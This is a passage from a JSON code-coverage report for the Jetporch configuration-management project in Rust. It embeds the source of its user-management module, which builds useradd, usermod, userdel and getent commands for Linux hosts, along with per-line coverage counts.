:0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[],"length":0,"stats":{"Line":0}},{"line":127,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":134,"address":[],"length":0,"stats":{"Line":0}},{"line":135,"address":[],"length":0,"stats":{"Line":0}},{"line":136,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":143,"address":[],"length":0,"stats":{"Line":0}},{"line":147,"address":[],"length":0,"stats":{"Line":0}},{"line":148,"address":[],"length":0,"stats":{"Line":0}},{"line":149,"address":[],"length":0,"stats":{"Line":0}},{"line":153,"address":[],"length":0,"stats":{"Line":0}},{"line":161,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":169,"address":[],"length":0,"stats":{"Line":0}},{"line":170,"address":[],"length":0,"stats":{"Line":0}},{"line":171,"address":[],"length":0,"stats":{"Line":0}},{"line":172,"address":[],"length":0,"stats":{"Line":0}},{"line":176,"address":[],"length":0,"stats":{"Line":0}},{"line":177,"address":[],"length":0,"stats":{"Line":0}},{"line":188,"address":[],"length":0,"stats":{"Line":0}},{"line":189,"address":[],"length":0,"stats":{"Line":0}},{"line":190,"address":[],"length":0,"stats":{"Line":0}},{"line":192,"address":[],"length":0,"stats":{"Line":0}},{"line":194,"address":[],"length":0,"stats":{"Line":0}},{"line":195,"address":[],"length":0,"stats":{"Line":0}},{"line":196,"address":[],"length":0,"stats":{"Line":0}},{"line":197,"address":[],"length":0,"stats":{"Line":0}},{"line":200,"address":[],"length":0,"stats":{"Line":0}},{"line":204,"address":[],"length":0,"stats":{"Line":0}},{"line":209,"address":[],"length":0,"stats":{"Line":0}},{"line":212,"address":[],"length":0,"stats":{"Line":0}},{"line":213,"address":[],"length":0,"stats":{"Line":0}},{"line":214,"address":[],"length":0,"stats":{"Line":0}},{"line":215,"address":[],"length":0,"stats":{"Line":0}},{"line":217,"address":[],"length":0,"stats":{"Line":0}},{"line":218,"address":[],"length":0,"stats":{"Line":0}},{"line":220,"address":[],"length":0,"stats":{"Line":0}},{"line":221,"address":[],"length":0,"stats":{"Line":0}},{"line":224,"address":[],"length":0,"stats":{"Line":0}},{"line":225,"address":[],"length":0,"stats":{"Line":0}},{"line":226,"address":[],"length":0,"stats":{"Line":0}},{"line":227,"address":[],"length":0,"stats":{"Line":0}},{"line":229,"address":[],"length":0,"stats":{"Line":0}},{"line":233,"address":[],"length":0,"stats":{"Line":0}},{"line":234,"address":[],"length":0,"stats":{"Line":0}},{"line":235,"address":[],"length":0,"stats":{"Line":0}},{"line":236,"address":[],"length":0,"stats":{"Line":0}},{"line":237,"address":[],"length":0,"stats":{"Line":0}},{"line":239,"address":[],"length":0,"stats":{"Line":0}},{"line":240,"address":[],"length":0,"stats":{"Line":0}},{"line":242,"address":[],"length":0,"stats":{"Line":0}},{"line":245,"address":[],"length":0,"stats":{"Line":0}},{"line":246,"address":[],"length":0,"stats":{"Line":0}},{"line":247,"address":[],"length":0,"stats":{"Line":0}},{"line":249,"address":[],"length":0,"stats":{"Line":0}},{"line":251,"address":[],"length":0,"stats":{"Line":0}},{"line":252,"address":[],"length":0,"stats":{"Line":0}},{"line":253,"address":[],"length":0,"stats":{"Line":0}},{"line":254,"address":[],"length":0,"stats":{"Line":0}},{"line":256,"address":[],"length":0,"stats":{"Line":0}},{"line":257,"address":[],"length":0,"stats":{"Line":0}},{"line":261,"address":[],"length":0,"stats":{"Line":0}},{"line":262,"address":[],"length":0,"stats":{"Line":0}},{"line":268,"address":[],"length":0,"stats":{"Line":0}},{"line":269,"address":[],"length":0,"stats":{"Line":0}},{"line":273,"address":[],"length":0,"stats":{"Line":0}},{"line":276,"address":[],"length":0,"stats":{"Line":0}},{"line":277,"address":[],"length":0,"stats":{"Line":0}},{"line":280,"address":[],"length":0,"stats":{"Line":0}},{"line":281,"address":[],"length":0,"stats":{"Line":0}},{"line":282,"address":[],"length":0,"stats":{"Line":0}},{"line":283,"address":[],"length":0,"stats":{"Line":0}},{"line":285,"address":[],"length":0,"stats":{"Line":0}},{"line":286,"address":[],"length":0,"stats":{"Line":0}},{"line":289,"address":[],"length":0,"stats":{"Line":0}},{"line":292,"address":[],"length":0,"stats":{"Line":0}},{"line":293,"address":[],"length":0,"stats":{"Line":0}},{"line":295,"address":[],"length":0,"stats":{"Line":0}},{"line":297,"address":[],"length":0,"stats":{"Line":0}},{"line":299,"address":[],"length":0,"stats":{"Line":0}},{"line":301,"address":[],"length":0,"stats":{"Line":0}},{"line":302,"address":[],"length":0,"stats":{"Line":0}},{"line":303,"address":[],"length":0,"stats":{"Line":0}},{"line":304,"address":[],"length":0,"stats":{"Line":0}},{"line":306,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":132},{"path":["/","Users","wings","projects","jetpack","src","modules","access","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - JetPorch Project Contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\n/** ADD MODULES HERE, KEEP ALPHABETIZED **/\n\npub mod group;\npub mod user;\n","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","modules","access","user.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - JetPorch Project Contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::inventory::hosts::HostOSType;\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse crate::tasks::fields::Field;\nuse serde::{Deserialize};\nuse std::collections::{HashSet};\nuse std::sync::Arc;\nuse std::vec::Vec;\n\nconst MODULE: \u0026str = \"user\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct UserTask {\n    pub name:              Option\u003cString\u003e,\n    pub user:              String,\n    pub uid:               Option\u003cString\u003e,\n    pub system:            Option\u003cString\u003e,\n    pub gid:               Option\u003cString\u003e,\n    pub groups:            Option\u003cHashSet\u003cString\u003e\u003e,\n    pub append:            Option\u003cString\u003e,\n    pub create_home:       Option\u003cString\u003e,\n    pub create_user_group: Option\u003cString\u003e,\n    pub gecos:             Option\u003cString\u003e,\n    pub shell:             Option\u003cString\u003e,\n    pub remove:            Option\u003cString\u003e,\n    pub cleanup:           Option\u003cString\u003e,\n    pub with:              Option\u003cPreLogicInput\u003e,\n    pub and:               Option\u003cPostLogicInput\u003e\n}\n\nstruct UserAction {\n    pub user:              String,\n    pub uid:               Option\u003cu64\u003e,\n    pub system:            bool,\n    pub gid:               Option\u003cString\u003e,\n    pub groups:            Option\u003cHashSet\u003cString\u003e\u003e,\n    pub append:            bool,\n    pub create_home:       bool,\n    pub create_user_group: bool,\n    pub gecos:             Option\u003cString\u003e,\n    pub shell:             Option\u003cString\u003e,\n    pub remove:            bool,\n    pub cleanup:           bool,\n}\n\nstruct UserDetails {\n    exists:     bool,\n    uid:        Option\u003cu64\u003e,\n    gid:        Option\u003cString\u003e,\n    groups:     Option\u003cHashSet\u003cString\u003e\u003e,\n    gecos:      Option\u003cString\u003e,\n    shell:      Option\u003cString\u003e,\n}\n\nimpl IsTask for UserTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(UserAction {\n                    user:              handle.template.string_no_spaces(request, tm, \u0026String::from(\"user\"), \u0026self.user)?,\n                    uid:               handle.template.integer_option(request, tm, \u0026String::from(\"uid\"), \u0026self.uid, None)?,\n                    system:            handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"system\"), \u0026self.system)?,\n                    gid:               handle.template.string_option(request, tm, \u0026String::from(\"gid\"), \u0026self.gid)?,\n                    groups:         {\n                        match \u0026self.groups {\n                            Some(groups) =\u003e {\n                                let mut templated_groups: HashSet\u003cString\u003e = HashSet::new();\n                                for group in groups {\n                                    templated_groups.insert(handle.template.string_no_spaces(request, tm, \u0026String::from(\"groups\"), group)?);\n                                }\n                                Some(templated_groups)\n                            },\n                            None =\u003e {None}\n                        }\n                    },\n                    append:            handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"append\"), \u0026self.append)?,\n                    create_home:       handle.template.boolean_option_default_true(\u0026request, tm, \u0026String::from(\"create_home\"), \u0026self.create_home)?,\n                    create_user_group: handle.template.boolean_option_default_true(\u0026request, tm, \u0026String::from(\"create_user_group\"), \u0026self.create_user_group)?,\n                    gecos:             handle.template.string_option(request, tm, \u0026String::from(\"gecos\"), \u0026self.gecos)?,\n                    shell:             handle.template.string_option(request, tm, \u0026String::from(\"shell\"), \u0026self.shell)?,\n                    remove:            handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"remove\"), \u0026self.remove)?,\n                    cleanup:           handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"cleanup\"), \u0026self.cleanup)?,\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?),\n            }\n        );\n    }\n\n}\n\nimpl IsAction for UserAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n\n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n\n                let os_type = handle.host.read().unwrap().os_type.unwrap();\n                if os_type != HostOSType::Linux {\n                    return Err(handle.response.is_failed(request, \u0026String::from(\"this user module only supports Linux\")));\n                }\n\n                let actual: UserDetails = self.get_user_details(handle, request)?;\n\n                match (actual.exists, self.remove) {\n                    (false, true)  =\u003e return Ok(handle.response.is_matched(request)),\n                    (false, false) =\u003e return Ok(handle.response.needs_creation(request)),\n                    (true, true)   =\u003e return Ok(handle.response.needs_removal(request)),\n                    (true, false)  =\u003e {\n\n                        let mut changes : Vec\u003cField\u003e = Vec::new();\n                        if UserAction::u64_wants_change(\u0026self.uid, \u0026actual.uid) { changes.push(Field::Uid); }\n                        if UserAction::string_wants_change(\u0026self.gid, \u0026actual.gid) { changes.push(Field::Gid); }\n                        if UserAction::string_wants_change(\u0026self.gecos, \u0026actual.gecos) { changes.push(Field::Gecos); }\n                        if UserAction::string_wants_change(\u0026self.shell, \u0026actual.shell){ changes.push(Field::Shell); }\n                        if self.groups_wants_change(\u0026actual) { changes.push(Field::Groups); }\n\n                        match changes.len() {\n                            0 =\u003e return Ok(handle.response.is_matched(request)),\n                            _ =\u003e return Ok(handle.response.needs_modification(request, \u0026changes)),\n                        }\n                    }\n                }\n            },\n\n            TaskRequestType::Create =\u003e {\n                let cmd = self.create_user_command();\n                handle.remote.run(request, \u0026cmd, CheckRc::Checked)?;\n                return Ok(handle.response.is_created(request));\n            },\n\n            TaskRequestType::Modify =\u003e {\n                let actual: UserDetails = self.get_user_details(handle, request)?;\n                let cmd = self.modify_user_command(\u0026actual);\n                handle.remote.run(request, \u0026cmd, CheckRc::Checked)?;\n                return Ok(handle.response.is_modified(request, request.changes.clone()));\n            },\n\n            TaskRequestType::Remove =\u003e {\n                let cmd = self.delete_user_command();\n                handle.remote.run(request, \u0026cmd, CheckRc::Checked)?;\n                return Ok(handle.response.is_removed(request))\n            }\n\n            // no passive or execute leg\n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n\n\n        }\n    }\n}\n\nimpl UserAction {\n\n    fn get_gid(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cString,Arc\u003cTaskResponse\u003e\u003e  {\n        let cmd = self.get_user_gid_command();\n        let result = handle.remote.run(request, \u0026cmd, CheckRc::Checked)?;\n        let (_, out) = cmd_info(\u0026result);\n        return Ok(out);\n    }\n\n    fn get_groups(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cHashSet\u003cString\u003e,Arc\u003cTaskResponse\u003e\u003e  {\n        let cmd = self.get_user_groups_command();\n        let result = handle.remote.run(request, \u0026cmd, CheckRc::Checked)?;\n        let (_, out) = cmd_info(\u0026result);\n        let str_vec: Vec\u003c\u0026str\u003e = out.split_whitespace().collect();\n        let groups: HashSet\u003cString\u003e = str_vec.iter().map(|\u0026s| s.to_string()).collect();\n        return Ok(groups);\n    }\n\n    fn get_user_details (\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cUserDetails,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = self.get_user_command();\n        let result = handle.remote.run(request, \u0026cmd, CheckRc::Unchecked)?;\n        let (rc, out) = cmd_info(\u0026result);\n\n        match rc {\n            // return early if user does not exist (rc = 2)\n            2 =\u003e {\n                return Ok(UserDetails {\n                    exists:     false,\n                    uid:        None,\n                    gid:        None,\n                    groups:     None,\n                    gecos:      None,\n                    shell:      None,\n                })\n            }\n            0 =\u003e {\n                let items: Vec\u003c\u0026str\u003e = out.split(\":\").collect();\n                let gid =  Some(self.get_gid(handle, request)?);\n                let groups = Some(self.get_groups(handle, request)?);\n                    return Ok(UserDetails {\n                        exists: true,\n                        uid:    Some(items[2].parse().unwrap()),\n                        gid:    gid,\n                        groups: groups,\n                        gecos:  Some(items[4].to_string()),\n                        shell:  Some(items[6].to_string()),\n                    })\n            }\n            x =\u003e { return Err(handle.response.is_failed(request, \u0026format!(\"failure getting user details, rc: '{}'\", x))); }\n        }\n    }\n\n    fn get_user_command(\u0026self) -\u003e String {\n        // returns a string devided by 6 colons (':')\n        // user:pwd:UID:GID:Gecos:Homedir:Shell\n        // F.e.: alice:x:1000:1000:alice:/home/alice:/bin/bash\n        // Of course: the pwd field does just contain an 'x' in modern Unix/Linux because of /etc/shadow\n        return format!(\"getent passwd '{}'\", self.user);\n    }\n\n    fn create_user_command(\u0026self) -\u003e String {\n        let mut cmd = String::from(\"useradd\");\n\n        if self.uid.is_some() {\n            cmd.push_str(\u0026format!(\" -u '{}'\", self.uid.as_ref().unwrap()));\n        }\n        if self.system \u0026\u0026 self.uid.is_none() {\n            cmd.push_str(\" -r\");\n        }\n        if self.gid.is_some() {\n            cmd.push_str(\u0026format!(\" -g '{}'\", self.gid.as_ref().unwrap()));\n        }\n        if self.groups.is_some() {\n            let final_groups: Vec\u003cString\u003e = self.groups.as_ref().unwrap().iter().cloned().collect();\n            cmd.push_str(\u0026format!(\" -G '{}'\", final_groups.join(\",\")));\n        }\n        if self.create_home {\n            cmd.push_str(\" -m\");\n        } else {\n            cmd.push_str(\" -M\");\n        }\n        if self.create_user_group {\n            cmd.push_str(\" -U\");\n        } else {\n            cmd.push_str(\" -N\");\n        }\n        if self.gecos.is_some() {\n            cmd.push_str(\u0026format!(\" -c '{}'\", self.gecos.as_ref().unwrap()));\n        }\n        if self.shell.is_some() {\n            cmd.push_str(\u0026format!(\" -s '{}'\", self.shell.as_ref().unwrap()));\n        }\n\n        cmd.push_str(\u0026format!(\" '{}'\", self.user));\n        return cmd;\n    }\n\n    fn modify_user_command(\u0026self, actual: \u0026UserDetails) -\u003e String {\n        let mut cmd = String::from(\"usermod\");\n\n        if self.uid.is_some() {\n            cmd.push_str(\u0026format!(\" -u '{}'\", self.uid.as_ref().unwrap()));\n        }\n        if self.gid.is_some() {\n            cmd.push_str(\u0026format!(\" -g '{}'\", self.gid.as_ref().unwrap()));\n        }\n        if self.gecos.is_some() {\n            cmd.push_str(\u0026format!(\" -c '{}'\", self.gecos.as_ref().unwrap()));\n        }\n        if self.shell.is_some() {\n            cmd.push_str(\u0026format!(\" -s '{}'\", self.shell.as_ref().unwrap()));\n        }\n\n        if self.groups.is_some() {\n            match self.append {\n                    true =\u003e {\n                        match \u0026actual.groups {\n                            // if some groups already exist, we need to add the new ones\n                            Some(actual_groups) =\u003e {\n                                let mut groups = self.groups.clone().unwrap();\n                                for group in actual_groups {\n                                    groups.insert(group.clone());\n                                }\n                                let final_groups: Vec\u003cString\u003e = groups.iter().cloned().collect();\n                                cmd.push_str(\u0026format!(\" -G '{}'\",final_groups.join(\",\")));\n                            },\n                            // otherwise we just take the new ones\n                            None =\u003e {\n                                let final_groups: Vec\u003cString\u003e = self.groups.as_ref().unwrap().iter().cloned().collect();\n                                cmd.push_str(\u0026format!(\" -G '{}'\",final_groups.join(\",\")));\n                            }\n                        }\n                    },\n                    // just replace existing groups with new groups\n                    false =\u003e {\n                        let final_groups: Vec\u003cString\u003e = self.groups.as_ref().unwrap().iter().cloned().collect();\n                        cmd.push_str(\u0026format!(\" -G '{}'\", final_groups.join(\",\")));\n                    }\n            }\n        }\n        cmd.push_str(\u0026format!(\" '{}'\", self.user));\n\n        return cmd;\n    }\n\n    fn delete_user_command(\u0026self) -\u003e String {\n        match self.cleanup {\n            false =\u003e return format!(\"userdel '{}'\", self.user),\n            true =\u003e return format!(\"userdel -r '{}'\", self.user),\n        }\n    }\n\n    fn get_user_gid_command(\u0026self) -\u003e String {\n        // returns a string containing the primary group name.\n        return format!(\"id -gn '{}'\", self.user);\n    }\n\n    fn get_user_groups_command(\u0026self) -\u003e String {\n        // returns a string containing a space separated list of group names.\n        return format!(\"id -Gn '{}'\", self.user);\n    }\n\n    fn string_wants_change(our: \u0026Option\u003cString\u003e, actual: \u0026Option\u003cString\u003e) -\u003e bool {\n        if our.is_some() {\n            if actual.is_none() {\n                return true\n            }\n            if ! our.as_ref().unwrap().eq(actual.as_ref().unwrap()) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    fn u64_wants_change(our: \u0026Option\u003cu64\u003e, actual: \u0026Option\u003cu64\u003e) -\u003e bool {\n        if our.is_some() {\n            if actual.is_none() {\n                return true\n            }\n            if ! our.as_ref().unwrap().eq(actual.as_ref().unwrap()) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    fn groups_wants_change(\u0026self, actual: \u0026UserDetails) -\u003e bool {\n        \n        if self.groups.is_none() {\n            // no preference about configuration on the remote system\n            return false\n        }\n        if actual.groups.is_none() {\n            // no remote groups yet\n            return true;\n        }\n        \n        let actual_groups      = actual.groups.as_ref().unwrap();\n        let actual_gid         = actual.gid.as_ref().unwrap();\n        let mut desired_groups = self.groups.clone().unwrap();\n\n        desired_groups.insert(actual_gid.to_string());\n        if self.append { \n            return ! desired_groups.is_subset(\u0026actual_groups);\n        } else {\n            return desired_groups != *actual_groups\n        }\n    \n    }\n\n}\n","traces":[{"line":74,"address":[],"length":0,"stats":{"Line":2}},{"line":75,"address":[],"length":0,"stats":{"Line":1}},{"line":76,"address":[],"length":0,"stats":{"Line":1}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":90,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":131,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":136,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":143,"address":[],"length":0,"stats":{"Line":0}},{"line":144,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":152,"address":[],"length":0,"stats":{"Line":0}},{"line":153,"address":[],"length":0,"stats":{"Line":0}},{"line":154,"address":[],"length":0,"stats":{"Line":0}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":0}},{"line":160,"address":[],"length":0,"stats":{"Line":0}},{"line":161,"address":[],"length":0,"stats":{"Line":0}},{"line":165,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":167,"address":[],"length":0,"stats":{"Line":0}},{"line":171,"address":[],"length":0,"stats":{"Line":0}},{"line":180,"address":[],"length":0,"stats":{"Line":0}},{"line":181,"address":[],"length":0,"stats":{"Line":0}},{"line":182,"address":[],"length":0,"stats":{"Line":0}},{"line":183,"address":[],"length":0,"stats":{"Line":0}},{"line":184,"address":[],"length":0,"stats":{"Line":0}},{"line":187,"address":[],"length":0,"stats":{"Line":0}},{"line":188,"address":[],"length":0,"stats":{"Line":0}},{"line":189,"address":[],"length":0,"stats":{"Line":0}},{"line":190,"address":[],"length":0,"stats":{"Line":0}},{"line":191,"address":[],"length":0,"stats":{"Line":0}},{"line":192,"address":[],"length":0,"stats":{"Line":0}},{"line":193,"address":[],"length":0,"stats":{"Line":0}},{"line":196,"address":[],"length":0,"stats":{"Line":0}},{"line":197,"address":[],"length":0,"stats":{"Line":0}},{"line":198,"address":[],"length":0,"stats":{"Line":0}},{"line":199,"address":[],"length":0,"stats":{"Line":0}},{"line":201,"address":[],"length":0,"stats":{"Line":0}},{"line":204,"address":[],"length":0,"stats":{"Line":0}},{"line":205,"address":[],"length":0,"stats":{"Line":0}},{"line":206,"address":[],"length":0,"stats":{"Line":0}},{"line":207,"address":[],"length":0,"stats":{"Line":0}},{"line":208,"address":[],"length":0,"stats":{"Line":0}},{"line":209,"address":[],"length":0,"stats":{"Line":0}},{"line":210,"address":[],"length":0,"stats":{"Line":0}},{"line":214,"address":[],"length":0,"stats":{"Line":0}},{"line":215,"address":[],"length":0,"stats":{"Line":0}},{"line":216,"address":[],"length":0,"stats":{"Line":0}},{"line":217,"address":[],"length":0,"stats":{"Line":0}},{"line":218,"address":[],"length":0,"stats":{"Line":0}},{"line":219,"address":[],"length":0,"stats":{"Line":0}},{"line":220,"address":[],"length":0,"stats":{"Line":0}},{"line":221,"address":[],"length":0,"stats":{"Line":0}},{"line":222,"address":[],"length":0,"stats":{"Line":0}},{"line":223,"address":[],"length":0,"stats":{"Line":0}},{"line":226,"address":[],"length":0,"stats":{"Line":0}},{"line":230,"address":[],"length":0,"stats":{"Line":0}},{"line":235,"address":[],"length":0,"stats":{"Line":0}},{"line":238,"address":[],"length":0,"stats":{"Line":0}},{"line":239,"address":[],"length":0,"stats":{"Line":0}},{"line":241,"address":[],"length":0,"stats":{"Line":0}},{"line":242,"address":[],"length":0,"stats":{"Line":0}},{"line":244,"address":[],"length":0,"stats":{"Line":0}},{"line":245,"address":[],"length":0,"stats":{"Line":0}},{"line":247,"address":[],"length":0,"stats":{"Line":0}},{"line":248,"address":[],"length":0,"stats":{"Line":0}},{"line":250,"address":[],"length":0,"stats":{"Line":0}},{"line":251,"address":[],"length":0,"stats":{"Line":0}},{"line":252,"address":[],"length":0,"stats":{"Line":0}},{"line":254,"address":[],"length":0,"stats":{"Line":0}},{"line":255,"address":[],"length":0,"stats":{"Line":0}},{"line":257,"address":[],"length":0,"stats":{"Line":0}},{"line":259,"address":[],"length":0,"stats":{"Line":0}},{"line":260,"address":[],"length":0,"stats":{"Line":0}},{"line":262,"address":[],"length":0,"stats":{"Line":0}},{"line":264,"address":[],"length":0,"stats":{"Line":0}},{"line":265,"address":[],"length":0,"stats":{"Line":0}},{"line":267,"address":[],"length":0,"stats":{"Line":0}},{"line":268,"address":[],"length":0,"stats":{"Line":0}},{"line":271,"address":[],"length":0,"stats":{"Line":0}},{"line":272,"address":[],"length":0,"stats":{"Line":0}},{"line":275,"address":[],"length":0,"stats":{"Line":0}},{"line":276,"address":[],"length":0,"stats":{"Line":0}},{"line":278,"address":[],"length":0,"stats":{"Line":0}},{"line":279,"address":[],"length":0,"stats":{"Line":0}},{"line":281,"address":[],"length":0,"stats":{"Line":0}},{"line":282,"address":[],"length":0,"stats":{"Line":0}},{"line":284,"address":[],"length":0,"stats":{"Line":0}},{"line":285,"address":[],"length":0,"stats":{"Line":0}},{"line":287,"address":[],"length":0,"stats":{"Line":0}},{"line":288,"address":[],"length":0,"stats":{"Line":0}},{"line":291,"address":[],"length":0,"stats":{"Line":0}},{"line":292,"address":[],"length":0,"stats":{"Line":0}},{"line":294,"address":[],"length":0,"stats":{"Line":0}},{"line":296,"address":[],"length":0,"stats":{"Line":0}},{"line":297,"address":[],"length":0,"stats":{"Line":0}},{"line":298,"address":[],"length":0,"stats":{"Line":0}},{"line":299,"address":[],"length":0,"stats":{"Line":0}},{"line":301,"address":[],"length":0,"stats":{"Line":0}},{"line":302,"address":[],"length":0,"stats":{"Line":0}},{"line":305,"address":[],"length":0,"stats":{"Line":0}},{"line":306,"address":[],"length":0,"stats":{"Line":0}},{"line":307,"address":[],"length":0,"stats":{"Line":0}},{"line":312,"address":[],"length":0,"stats":{"Line":0}},{"line":313,"address":[],"length":0,"stats":{"Line":0}},{"line":314,"address":[],"length":0,"stats":{"Line":0}},{"line":318,"address":[],"length":0,"stats":{"Line":0}},{"line":320,"address":[],"length":0,"stats":{"Line":0}},{"line":323,"address":[],"length":0,"stats":{"Line":0}},{"line":324,"address":[],"length":0,"stats":{"Line":0}},{"line":325,"address":[],"length":0,"stats":{"Line":0}},{"line":326,"address":[],"length":0,"stats":{"Line":0}},{"line":330,"address":[],"length":0,"stats":{"Line":0}},{"line":332,"address":[],"length":0,"stats":{"Line":0}},{"line":335,"address":[],"length":0,"stats":{"Line":0}},{"line":337,"address":[],"length":0,"stats":{"Line":0}},{"line":340,"address":[],"length":0,"stats":{"Line":0}},{"line":341,"address":[],"length":0,"stats":{"Line":0}},{"line":342,"address":[],"length":0,"stats":{"Line":0}},{"line":343,"address":[],"length":0,"stats":{"Line":0}},{"line":345,"address":[],"length":0,"stats":{"Line":0}},{"line":346,"address":[],"length":0,"stats":{"Line":0}},{"line":349,"address":[],"length":0,"stats":{"Line":0}},{"line":352,"address":[],"length":0,"stats":{"Line":0}},{"line":353,"address":[],"length":0,"stats":{"Line":0}},{"line":354,"address":[],"length":0,"stats":{"Line":0}},{"line":355,"address":[],"length":0,"stats":{"Line":0}},{"line":357,"address":[],"length":0,"stats":{"Line":0}},{"line":358,"address":[],"length":0,"stats":{"Line":0}},{"line":361,"address":[],"length":0,"stats":{"Line":0}},{"line":364,"address":[],"length":0,"stats":{"Line":0}},{"line":366,"address":[],"length":0,"stats":{"Line":0}},{"line"